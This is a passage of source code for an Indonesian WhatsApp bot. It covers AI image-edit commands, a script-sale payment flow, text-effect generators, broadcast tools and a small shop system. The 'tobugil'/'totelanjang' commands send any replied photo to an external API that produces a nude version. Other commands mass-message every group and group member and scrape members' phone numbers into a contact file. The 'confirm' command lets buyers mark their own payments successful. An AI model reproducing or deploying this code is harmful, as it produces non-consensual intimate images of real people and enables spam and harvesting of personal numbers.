        const apiUrl = `https://api-faa.my.id/faa/tosexy?url=${directLink}&kunci=boom`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = ``;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: fakeQuoted });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`âŒ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break;
case 'putihkan':
case 'hitamkan': {

if (!isPremium) return reply(mess.prem)
 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`mana foto nya?`);
    }
 
    reply('Loading...');

    try {
        
        let media = await sock.downloadAndSaveMediaMessage(quoted);
        let directLink = await CatBox(media);
        const apiUrl = `https://api-faa.my.id/faa/editfoto?url=${encodeURIComponent(directLink)}&prompt=${command} warna kulit nya`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = `Nih wir!! Gacor ga?! ğŸ˜ğŸ”¥\n\n*PROMPT:*\n_"${text}"_`;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: fakeQuoted });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`âŒ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break;
case 'artany':
case 'imgedit':
case 'edit':
case 'nano':
case 'banana':
case 'nanobanana':
case 'ai-edit': 
case 'edit':
case 'editimg':
case 'editai': {
if (!isPremium) return reply(mess.prem)
  if (!m.quoted) return reply('âŒ Reply foto yang mau diedit')
  if (!/image/.test(m.quoted.mtype)) return reply('âŒ Yang direply harus foto')
  if (!q) return reply('âŒ Masukkan prompt edit\n\nContoh:\n.edit ubah warna mata jadi hijau')

  reply('â³ Memproses edit gambar...')

  // download foto dari reply
  const media = await sock.downloadMediaMessage(m.quoted)

  // upload foto awal ke catbox
  const imageUrl = await CatBox(media)

  // panggil API edit foto
  const apiUrl = `https://api-faa.my.id/faa/editfoto?url=${encodeURIComponent(imageUrl)}&prompt=${encodeURIComponent(q)}`
  const res = await fetch(apiUrl)
  const json = await res.json()

  if (!json.status) return reply('âŒ Gagal mengedit gambar')

  // hasil edit (biasanya berupa url)
  const editedImage = json.result || json.url || json.data

  // download hasil edit
  const editedBuffer = await (await fetch(editedImage)).buffer()

  // upload hasil edit ke catbox
  const finalImage = await CatBox(editedBuffer)

  // kirim hasil
  await sock.sendMessage(m.chat, {
    image: { url: finalImage },
    caption: `âœ… *Edit Berhasil*\n\nğŸ“ Prompt:\n${q}`
  }, { quoted: m })

}
break
case 'tobersama': {

if (!isPremium) return reply(mess.prem)
 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`mana foto nya?`);
    }
    if (!text) return reply(`contoh ${cmd} nama idola mu`)
 
    reply('Loading...');

    try {
        
        let media = await sock.downloadAndSaveMediaMessage(quoted);
        let directLink = await CatBox(media);
        
        const apiUrl = `https://api-faa.my.id/faa/tobersama?url=${directLink}&nama-artis=${text}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = `Nih wir!! Gacor ga?! ğŸ˜ğŸ”¥\n\n*PROMPT:*\n_"${text}"_`;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: fakeQuoted });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`âŒ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break;    
case 'tosad':
case 'tosatan':
case 'tosdmtinggi':
case 'toreal':
case 'tomoai':
case 'tomaya':
case 'tolego':
case 'tokamboja':
case 'tokacamata':
case 'tojepang':
case 'toghibli':
case 'todubai':
case 'todpr':
case 'tochibi':
case 'tobrewok':
case 'tobabi':
case 'toblonde':
case 'tobotak':
case 'tohijab':
case 'tomekah':
case 'tomirror':
case 'tovintage':
case 'toliquor':
case 'tomaid':
case 'tomangu':
case 'topeci':
case 'topiramida':
case 'topolaroid':
case 'topunk':
case 'toroh':
case 'tosatan':
case 'tostreetwear':
case 'totato':
case 'totrain':
case 'totua':
case 'toturky':
case 'toreal':
case 'toanime': {

if (!isPremium) return reply(mess.prem)
 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`mana foto nya?`);
    }
 
    reply('Loading...');

    try {
        
        let media = await sock.downloadAndSaveMediaMessage(quoted);
        let directLink = await CatBox(media);
        
        const apiUrl = `https://api-faa.my.id/faa/${command}?url=${encodeURIComponent(directLink)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = `Nih wir!! Gacor ga?! ğŸ˜ğŸ”¥\n\n*PROMPT:*\n_"${text}"_`;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: fakeQuoted });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`âŒ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break;    
case 'totelanjang':
case 'tobugil': {
  if (!isPremium) return reply(mess.prem)

  try {
    const q = m.quoted ? m.quoted : m
    const mime = (q.msg || q).mimetype || ''

    if (!/image/.test(mime)) {
      return reply('mana foto nya?')
    }
    React()
    // download media
    let media = await sock.downloadAndSaveMediaMessage(q)

    // upload ke catbox
    let directLink = await CatBox(media)

    // request api
    const api = await fetchJson(
      `https://api.baguss.xyz/api/edits/tobugil?image=${directLink}`
    )

    if (!api || !api.url) {
      throw 'Gagal mendapatkan hasil dari API'
    }

    await sock.sendMessage(
      m.chat,
      {
        image: { url: api.url },
        caption: 'Done.'
      },
      { quoted: m }
    )

  } catch (err) {
    console.error(err)
    reply('âŒ Terjadi kesalahan saat memproses gambar, coba lagi nanti.')
  }
}
break

/*
   PPOB
*/                         
case 'buysc':
case 'buyscript': {
  const ownerJid = [`${global.owner}@s.whatsapp.net`]
  for (let id of ownerJid)
    await sock.sendMessage(id, {
      text: `pesan ${cmd} dari @${m.sender.split("@")[0]}`,
      contextInfo:{ mentionedJid:[m.sender] }
    }, { quoted:m })

  if (!isPrivate) return reply(mess.private);

  // Tidak pakai nominal dari user â†’ default 25000
  let nominal = 25000;

  // Fee keuntungan (max global.pay.fee)
  let profitFee = Math.floor(Math.random() * global.pay.fee) + 1;
  let expired = Date.now() + (30 * 60 * 1000); // 30 menit

  let dep, res, data;

  try {
    const params = new URLSearchParams({ 
      nominal: nominal + profitFee, 
      metode: global.pay.metode 
    });

    res = await fetch(`https://ciaatopup.my.id/h2h/deposit/create?${params}`, {
      headers: { 
        'X-APIKEY': global.pay.apikey, 
        'Content-Type': 'application/json' 
      }
    });

    data = await res.json();
    if (!data.success) {
      return sock.sendMessage(m.chat, { 
        text: `âŒ Gagal membuat transaksi: ${data.message || 'Unknown error'}` 
      }, { quoted: fakeQuoted });
    }

    dep = data.data;

  } catch (err) {
    return sock.sendMessage(m.chat, { 
      text: `âŒ Error sistem: ${err.message}` 
    }, { quoted: fakeQuoted });
  }

  if (!dep) {
    return sock.sendMessage(m.chat, { text: `âŒ Error: Data tidak valid` }, { quoted: fakeQuoted });
  }

  // SIMPAN INVOICE
  if (!db.deposits) db.deposits = {};
  db.deposits[dep.id] = {
    user_id: m.sender,
    nominal,
    metode: global.pay.metode,
    status: "pending",
    expired_at: expired,
    profit_fee: profitFee,
    get_balance: dep.get_balance,
    fee_api: dep.fee,
    created_at: Date.now(),
    type: "buyscript"
  };
  fs.writeFileSync('./database/database.json', JSON.stringify(db, null, 2));

  let infoText =
    `ğŸ›’ *PEMBELIAN SCRIPT*\n\n` +
    `ğŸ“‹ ID: ${dep.id}\n` +
    `ğŸ’° Harga: Rp${nominal.toLocaleString()}\n` +
    `âš™ï¸ Fee: Rp${profitFee.toLocaleString()}\n` +
    `ğŸ’¸ Total Bayar: Rp${(nominal + profitFee).toLocaleString()}\n` +
    `â° Expired: 30 menit\n\n` +
    `Silakan scan QR dibawah untuk melanjutkan pembelian.`;

  // ===========================
  // FIX QR SEND (TANPA BUTTON)
  // ===========================
  try {
    let qr = await QRCode.toBuffer(dep.qr_string, { 
      width: 300, margin: 2, errorCorrectionLevel: 'M'
    });

    let sent = await sock.sendMessage(m.chat, {
      image: qr,
      caption: infoText
    }, { quoted: fakeQuoted });

    db.deposits[dep.id].messageId = sent.key.id;
    fs.writeFileSync('./database/database.json', JSON.stringify(db, null, 2));

  } catch (err) {
    return sock.sendMessage(m.chat, { text:`Error QR: ${err.message}` }, { quoted:m });
  }

  // AUTO CEK STATUS
  let checker = setInterval(async () => {
    try {
      let depositData = db.deposits[dep.id];
      if (!depositData) return clearInterval(checker);

      // Expired
      if (Date.now() > depositData.expired_at) {
        clearInterval(checker);

        await fetch(`https://ciaatopup.my.id/h2h/deposit/cancel?id=${dep.id}`, {
          headers: { 'X-APIKEY': global.pay.apikey }
        });

        depositData.status = "expired";
        fs.writeFileSync('./database/database.json', JSON.stringify(db, null, 2));

        return sock.sendMessage(m.chat, { 
          text: `âŒ Pembelian ${dep.id} expired & dibatalkan.` 
        }, { quoted:m });
      }

      // Cek status API
      let cek = await fetch(`https://ciaatopup.my.id/h2h/deposit/status?id=${dep.id}`, {
        headers: { 'X-APIKEY': global.pay.apikey }
      });
      let cj = await cek.json();

      if (cj.success && cj.data.status === "success") {
        clearInterval(checker);

        depositData.status = "success";
        fs.writeFileSync('./database/database.json', JSON.stringify(db, null, 2));

        // KIRIM FILE SCRIPT ZIP
        await sock.sendMessage(m.chat, {
          document: { url: "https://raw.githubusercontent.com/zionjs0/whatsapp-media/main/file_1764092341730" },
          mimetype: "application/zip",
          fileName: "Vynaa-Script.zip",
          caption: `ğŸ‰ *PEMBELIAN BERHASIL*\n\nTerima kasih!\nBerikut file script Anda.\n\nJoin Group Update\nhttps://chat.whatsapp.com/Ly3VsAtRTTs8zhhNpxtNfA`
        }, { quoted: fakeQuoted });

        return;
      }

    } catch (err) {
      console.log("Auto cek error:", err);
    }
  }, 1000);

  if (!global.depositCheckers) global.depositCheckers = {};
  global.depositCheckers[dep.id] = checker;
}
break;
/*
EPHOTO
*/
      case "glitchtext":
      case "writetext":
      case "advancedglow":
      case "typographytext":
      case "pixelglitch":
      case "neonglitch":
      case "flagtext":
      case "flag3dtext":
      case "deletingtext":
      case "blackpinkstyle":
      case "glowingtext":
      case "underwatertext":
      case "logomaker":
      case "cartoonstyle":
      case "papercutstyle":
      case "watercolortext":
      case "effectclouds":
      case "blackpinklogo":
      case "gradienttext":
      case "summerbeach":
      case "luxurygold":
      case "multicoloyellowneon":
      case "sandsummer":
      case "galaxywallpaper":
      case "1917style":
      case "makingneon":
      case "royaltext":
      case "freecreate":
      case "galaxystyle":
      case "lighteffects":
        {
        
          if (!q) {
            return reply(`Contoh : ${cmd} sock Assistent`);
          }
          let link;
          if (/glitchtext/.test(command)) {
            link = "https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html";
          }
          if (/writetext/.test(command)) {
            link = "https://en.ephoto360.com/write-text-on-wet-glass-online-589.html";
          }
          if (/advancedglow/.test(command)) {
            link = "https://en.ephoto360.com/advanced-glow-effects-74.html";
          }
          if (/typographytext/.test(command)) {
            link = "https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html";
          }
          if (/pixelglitch/.test(command)) {
            link = "https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html";
          }
          if (/neonglitch/.test(command)) {
            link = "https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html";
          }
          if (/flagtext/.test(command)) {
            link = "https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html";
          }
          if (/flag3dtext/.test(command)) {
            link = "https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html";
          }
          if (/deletingtext/.test(command)) {
            link = "https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html";
          }
          if (/blackpinkstyle/.test(command)) {
            link = "https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html";
          }
          if (/glowingtext/.test(command)) {
            link = "https://en.ephoto360.com/create-glowing-text-effects-online-706.html";
          }
          if (/underwatertext/.test(command)) {
            link = "https://en.ephoto360.com/3d-underwater-text-effect-online-682.html";
          }
          if (/logomaker/.test(command)) {
            link = "https://en.ephoto360.com/free-bear-logo-maker-online-673.html";
          }
          if (/cartoonstyle/.test(command)) {
            link = "https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html";
          }
          if (/papercutstyle/.test(command)) {
            link = "https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html";
          }
          if (/watercolortext/.test(command)) {
            link = "https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html";
          }
          if (/effectclouds/.test(command)) {
            link = "https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html";
          }
          if (/blackpinklogo/.test(command)) {
            link = "https://en.ephoto360.com/create-blackpink-logo-online-free-607.html";
          }
          if (/gradienttext/.test(command)) {
            link = "https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html";
          }
          if (/summerbeach/.test(command)) {
            link = "https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html";
          }
          if (/luxurygold/.test(command)) {
            link = "https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html";
          }
          if (/multicoloyellowneon/.test(command)) {
            link = "https://en.ephoto360.com/create-multicoloyellow-neon-light-signatures-591.html";
          }
          if (/sandsummer/.test(command)) {
            link = "https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html";
          }
          if (/galaxywallpaper/.test(command)) {
            link = "https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html";
          }
          if (/1917style/.test(command)) {
            link = "https://en.ephoto360.com/1917-style-text-effect-523.html";
          }
          if (/makingneon/.test(command)) {
            link = "https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html";
          }
          if (/royaltext/.test(command)) {
            link = "https://en.ephoto360.com/royal-text-effect-online-free-471.html";
          }
          if (/freecreate/.test(command)) {
            link = "https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html";
          }
          if (/galaxystyle/.test(command)) {
            link = "https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html";
          }
          if (/lighteffects/.test(command)) {
            link = "https://en.ephoto360.com/create-light-effects-green-neon-online-429.html";
          }
          let haldwhd = await ephoto(link, q);
          sock.sendMessage(m.chat, {
            image: {
              url: haldwhd
            },
            caption: `${name}`
          }, {
            quoted: fakeQuoted
          });
        }
        break;
        /*
        PUSH
        */
        case "addidch":
        case "addch": {
    if (!isOwner) return reply("âŒ Fitur ini hanya untuk Owner bot!");
    if (!text) return reply(`âš™ï¸ Contoh penggunaan:\n.addch 1203630xxxxx@newsletter`);

    const fs = require("fs");
    const path = "./database/broadcast.json";

    try {
        // Baca file broadcast.json
        let data = [];
        if (fs.existsSync(path)) {
            data = JSON.parse(fs.readFileSync(path));
        }

        // Tambahkan ID baru jika belum ada
        if (data.includes(text)) return reply("âš ï¸ ID saluran sudah terdaftar di broadcast list!");
        data.push(text);
        fs.writeFileSync(path, JSON.stringify(data, null, 2));

        reply(`âœ… Berhasil menambahkan ID saluran:\n${text}`);
    } catch (e) {
        console.error(e);
        reply("âŒ Gagal menambahkan ID saluran ke broadcast.json");
    }
}
break;
        case "jpmch":
        case "broadcastch": {
    if (!isOwner) return reply("âŒ Fitur ini hanya untuk Owner bot!");
    if (!text) return reply(`ğŸ“¢ Contoh penggunaan:\n.broadcastch Halo semua!`);

    const fs = require("fs");
    const path = "./database/broadcast.json";

    try {
        if (!fs.existsSync(path)) return reply("âš ï¸ File broadcast.json belum ada. Tambahkan saluran dulu dengan .addch");
        const list = JSON.parse(fs.readFileSync(path));

        if (!Array.isArray(list) || list.length === 0)
            return reply("âš ï¸ Belum ada ID saluran di broadcast list!");

        reply(`ğŸ“¡ Mengirim broadcast ke *${list.length}* saluran...`);

        for (let id of list) {
            await sock.sendMessage(id, { text });
            await sleep(1000); // delay 1 detik biar aman
        }

        reply(`âœ… Broadcast berhasil terkirim ke semua saluran!`);
    } catch (e) {
        console.error(e);
        reply("âŒ Terjadi kesalahan saat broadcast ke saluran.");
    }

    // Fungsi delay
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}
break;
        case 'jpm': case 'post': case 'pushcontactgc': {
if (!isOwner) return reply("*[ sÊsá´›á´‡á´ ] á´á´€á´€Ò“ ÉªÉ´Éª á´‹Êœá´œsá´œs á´á´¡É´á´‡Ê€")
if (!text) return reply(`*Incorrect Usage Please Use Like This*\n${cmd} text|pause\n\nreply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${cmd} hello|9000`)
await reply(`In progress...`)
let getGroups = await sock.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await sock.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await sock.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await sock.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: [m.sender] })
await sleep(text.split('|')[1])
} else {
await sock.sendMessage(xnxx, { text: text.split('|')[0], mentions: [m.sender] })
await sleep(text.split('|')[1])
}}
reply(`Success`)
}
break
case "pushcontact":
case "pushkontak": {
if (!isOwner) return reply(mess.owner)
    if (!text) return reply(`Format salah!

Contoh:
.pushkontak Halo semua.2000
(2000 = jeda per pesan dalam ms)
`);

    // Pisah dari titik terakhir
    let lastDot = text.lastIndexOf(".");
    if (lastDot === -1) return reply(`Format harus pakai titik!\nContoh: .pushkontak Halo.2000`);

    let pesan = text.slice(0, lastDot).trim();
    let jeda = text.slice(lastDot + 1).trim();

    if (!pesan) return reply("Pesan tidak boleh kosong!");
    if (!jeda || isNaN(jeda)) return reply("Jeda harus berupa angka (ms). Contoh: 2000");

    global.broadcastText = pesan;
    global.broadcastDelay = Number(jeda);

    reply(`âœ”ï¸ Pesan broadcast disimpan!
ğŸ“ Pesan: ${pesan}
â±ï¸ Jeda: ${jeda} ms

Gunakan *.pilihgrup* untuk memilih grup.
`);
}
break;
case 'listgrup':
case 'pilihgrup': {
    let groups = Object.values(await sock.groupFetchAllParticipating());

    if (groups.length === 0) return reply("Kamu tidak punya grup.");

    for (let i = 0; i < groups.length; i += 3) {

        let batch = groups.slice(i, i + 3);

        let buttons = batch.map(g => ({
            buttonId: `.settarget ${g.id}`,
            buttonText: { displayText: g.subject },
            type: 1
        }));

        await sock.sendMessage(m.chat, {
            text: `Pilih grup untuk target broadcast:\nBatch ${i / 3 + 1}`,
            footer: "Broadcast System",
            buttons,
            headerType: 1
        });

    }
}
break;
case 'startpush': {
    if (!global.broadcastText) return reply("âŒ Pesan belum diset. Gunakan *.pushkontak*");
    if (!global.broadcastTarget) return reply("âŒ Target grup belum dipilih. Gunakan *.pilihgrup*");
    if (!global.broadcastDelay) global.broadcastDelay = 1000; // default 1 detik

    let meta = await sock.groupMetadata(global.broadcastTarget);
    let members = meta.participants.map(p => p.id);

    reply(`ğŸš€ Memulai broadcast...
ğŸ“ Pesan: ${global.broadcastText}
ğŸ‘¥ Target: ${meta.subject}
â±ï¸ Jeda: ${global.broadcastDelay} ms
`);

    let success = 0;
    let failed = 0;

    for (let jid of members) {
        try {
            await sock.sendMessage(jid, { text: global.broadcastText });
            success++;
            await sleep(global.broadcastDelay);
        } catch {
            failed++;
        }
    }

    reply(`âœ”ï¸ Broadcast selesai!
Berhasil: ${success}
Gagal: ${failed}`);
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'settarget': {
    if (!text) return reply("ID grup tidak ditemukan!");

    global.broadcastTarget = text;

    reply(`âœ”ï¸ Target broadcast di set:\n${text}\n\nKetik *.startpush* untuk mulai broadcast`);
}
break;
case "done": {
if (!isOwner) return reply(mess.owner)
if (!q) return reply("jasa install panel")
let teks = `\nğŸ“¦ ${text}
â° ${tanggal(Date.now())}

*Testimoni :*
${linkch}
\n`
await sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done âœ…`, 
body: name, 
thumbnailUrl: thumbnail2, 
sourceUrl: null,
}}}, {quoted: fakeQuoted})
}
break 
case 'savecontact':
case 'savekontak': {
if (!isOwner) return reply(mess.owner)

    if (!m.isGroup) return reply(`Fitur ini hanya bisa di dalam grup.`);

    let meta = await sock.groupMetadata(m.chat);
    let members = meta.participants.map(p => p.id); // JID asli

    if (!members.length) return reply("Tidak ada member dalam grup.");

    reply(`ğŸ“¥ Mengambil semua kontak...\nTotal: ${members.length} member\nSedang membuat file vCard...`);

    let vcfContent = "";

    for (let jid of members) {
        let number = jid.split("@")[0];

        vcfContent += `BEGIN:VCARD
VERSION:3.0
FN:${number}
TEL;type=CELL;waid=${number}:${number}
END:VCARD

`;
    }

    // Simpan ke file
    let filename = `contact-${meta.subject.replace(/\W+/g, "_")}.vcf`;
    let filepath = `./${filename}`;

    fs.writeFileSync(filepath, vcfContent);

    await sock.sendMessage(m.sender, {
        document: fs.readFileSync(filepath),
        fileName: filename,
        mimetype: "text/vcard"
    });

    reply(`âœ”ï¸ Semua kontak sudah dikirim ke chat pribadi dalam 1 file VCF!`);
}
break;
			case "proses": {
if (!isOwner) return repy(mess.owner)
if (!q) return reply("jasa install panel")
let teks = `\nğŸ“¦ ${text}
â° ${tanggal(Date.now())}

*Testimoni :*
${linkch}\n`
await sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk âœ…`, 
body: name, 
thumbnailUrl: thumbnail2, 
sourceUrl: null,
}}}, {quoted: fakeQuoted})
}
break    
case "pay":
case "payment": {
const media = await prepareWAMessageMedia(
  { image: { url: qris } }, // ganti URL atau pakai file
  { upload: sock.waUploadToServer }
);

const msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({

                // HEADER DENGAN FOTO
                header: proto.Message.InteractiveMessage.Header.create({
                    hasMediaAttachment: true,
                    title: teks,
                    subtitle: "",
                    imageMessage: media.imageMessage,   // << FOTO MASUK DI SINI
                    headerType: 4 // wajib 4 untuk image header
                }),

                // BODY TEXT
                body: proto.Message.InteractiveMessage.Body.create({
                    text: teks
                }),

                // TOMBOL COPY
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [

                        // DANA
                        {
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                                display_text: `DANA [${namadana}]`,
                                id: dana,
                                copy_code: dana
                            })
                        },

                        // GOPAY
                        {
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                                display_text: `GOPAY [${namagopay}]`,
                                id: gopay,
                                copy_code: gopay
                            })
                        },

                        // OVO
                        {
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                                display_text: `OVO [${namaovo}]`,
                                id: ovo,
                                copy_code: ovo
                            })
                        }

                    ]
                })
            })
        }
    }
}, {});

await sock.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
});
}
  break   
  case 'addproduk': {

if (!text.includes(',')) return reply(`Contoh: ${cmd} nama_produk, harga, stok`)
const [productName, price, stock] = args.join(' ').split(',').map(item => item.trim())
const harga = parseInt(price, 10)
const jumlahStok = parseInt(stock, 10)
if (!productName || isNaN(harga) || isNaN(jumlahStok)) {
reply('Format tidak valid. Pastikan untuk memasukkan nama produk, harga, dan jumlah stok.')
} else {
const productExists = cekProduknye(productName)
if (productExists) {
reply(`Produk dengan nama "${productName}" sudah ada.`)
} else {
addprodukzz(productName, harga, jumlahStok)
reply(`Produk "${productName}" telah ditambahkan dengan harga ${toRupiah(harga)} dan stok sebanyak ${jumlahStok} unit.`)
}}}
break

case 'delproduk': {

if (!text) return reply(`Contoh: ${cmd} nama_produk`)
const productName = text.trim()
if (!productName) {
reply('Nama produk tidak valid.')
} else {
const productExists = cekProduknye(productName)
if (productExists) {
delprodukzz(productName)
reply(`Produk "${productName}" telah dihapus.`)
} else {
reply(`Produk "${productName}" tidak ditemukan.`)
}}}
break

case 'updateproduk': {

if (!text.includes(',')) return reply(`Contoh: ${cmd} nama_produk, harga, stok`)
const [productName, price, stock] = args.join(' ').split(',').map(item => item.trim())
const harga = parseInt(price, 10)
const jumlahStok = parseInt(stock, 10)
if (!productName || isNaN(harga) || isNaN(jumlahStok)) {
reply('Format tidak valid. Pastikan untuk memasukkan nama produk, harga, dan jumlah stok.')
} else {
const productExists = cekProduknye(productName)
if (productExists) {
updprodukzz(productName, harga, jumlahStok)
reply(`Produk "${productName}" telah diperbarui dengan harga ${toRupiah(harga)} dan stok sebanyak ${jumlahStok} unit.`)
} else {
reply(`Produk "${productName}" tidak ditemukan.`)
}}}
break

case 'listproduk': {

const products = getprodukdb()
const discounts = getDisczz()
if (products.length === 0) {
reply('Tidak ada produk yang tersedia saat ini.')
} else {
let listText = `List produk yg tersedia:\nTotal: ${products.length}\n\n`
products.forEach(product => {
const discount = discounts.find(d => d.produk.toLowerCase() === product.nama.toLowerCase())
if (discount) {
const discountPercentage = persenDiskonnya(product.harga, discount.harga_diskon)
listText += `â€¢ ${product.nama}\n  Harga: ~Rp${toRupiah(product.harga)}~ > Rp${toRupiah(discount.harga_diskon)} (${discountPercentage}%)\n  Stok: ${product.stok} unit\n\n`
} else {
listText += `â€¢ ${product.nama}\n  Harga: Rp${toRupiah(product.harga)}\n  Stok: ${product.stok} unit\n\n`
}})
reply(listText)
}}
break

case 'donate':
;

case 'diskon': {

if (!text.includes(',')) return reply(`Contoh: ${cmd} nama_produk, harga_diskon, tgl-bln-th`)
const [productName, discountPriceStr, expirationDate] = args.join(' ').split(',').map(item => item.trim())
const discountPrice = parseInt(discountPriceStr, 10)
if (!productName || isNaN(discountPrice) || !expirationDate) {
reply('Format tidak valid. Pastikan untuk memasukkan nama produk, harga diskon, dan tanggal kadaluarsa yang valid.')
} else {
const products = getprodukDariFile()
const product = products.find(p => p.nama.toLowerCase() === productName.toLowerCase())
if (!product) {
reply(`Produk "${productName}" tidak ditemukan.`)
} else {
addDisczz(productName, discountPrice, expirationDate)
const discountPercentage = persenDiskonnya(product.harga, discountPrice)
reply(`Diskon untuk produk "${productName}" berhasil ditambahkan.\nHarga diskon: Rp${discountPrice}, Berlaku hingga: ${expirationDate} (${discountPercentage}%)`)
}}}
break

case 'restok': {

if (!text.includes(',')) return reply(`Contoh: ${cmd} nama_produk, jumlah_stok`)
const [productName, stockStr] = args.join(' ').split(',').map(item => item.trim())
const jumlahStok = parseInt(stockStr, 10)
if (!productName || isNaN(jumlahStok) || jumlahStok <= 0) {
reply('Format tidak valid. Pastikan untuk memasukkan nama produk dan jumlah stok yang valid.')
} else {
const restockedProduct = ngerestokk(productName, jumlahStok)
if (restockedProduct) {
reply(`Stok produk "${restockedProduct.nama}" telah ditambahkan. Stok saat ini: ${restockedProduct.stok} unit.`)
} else {
reply(`Produk "${productName}" tidak ditemukan.`)
}}}
break

case 'beliproduk': {

if (!text.includes(',')) return reply(`Contoh: ${cmd} nama_produk, jumlah`)
const [productName, quantity] = args.join(' ').split(',').map(item => item.trim())
const jumlah = parseInt(quantity, 10)
if (!productName || isNaN(jumlah) || jumlah <= 0) {
return reply('Format tidak valid. Pastikan untuk memasukkan nama produk dan jumlah yang valid.')
}
const products = getprodukDariFile();
const product = products.find(p => p.nama.toLowerCase() === productName.toLowerCase())

if (!product) {
return reply(`Produk "${productName}" tidak ditemukan.`)}
if (product.stok < jumlah) {
return reply(`Stok untuk produk "${productName}" tidak mencukupi. Tersisa ${product.stok} unit.`)}
const discounts = getDisczz()
const discount = discounts.find(d => d.produk.toLowerCase() === product.nama.toLowerCase())
const totalHarga = discount ? discount.harga_diskon * jumlah : product.harga * jumlah
const transactionId = cIdTrnya()
reply(`
Kamu membeli ${jumlah} produk "${productName}"
Total harga: ${toRupiah(totalHarga)}

Silahkan transfer terlebih dahulu lalu
ketik .payment untuk melihat metode pembayaran yang tersedia

Ketik ini...
.confirm ${transactionId}
.cancel ${transactionId}
`)
saveTrnye({
id: transactionId,
productName,
jumlah,
totalHarga,
status: 'process',
buyer: m.sender
})
product.stok -= jumlah
simpenProduknya(products)
}
break

case 'confirm': {

const transactionId = text.trim().split(' ')[0]
if (!transactionId) return reply(`Contoh: ${cmd} id_transaksi`)
const transaction = getTrId(transactionId)
if (!transaction) {
return reply(`Transaksi dengan ID "${transactionId}" tidak ditemukan.`)
 }
if (transaction.status !== 'process') {
return reply('ID transaksi tidak valid atau tidak dalam status menunggu bukti transfer.')
}
transaction.status = 'success'
simpenSmTr(getSmTr().map(t => t.id === transactionId ? transaction : t))
reply(`Transaksi dengan ID "${transactionId}" telah berhasil dikonfirmasi.`)
}
break

case 'kensel': {

const transactionId = text.trim().split(' ')[0]
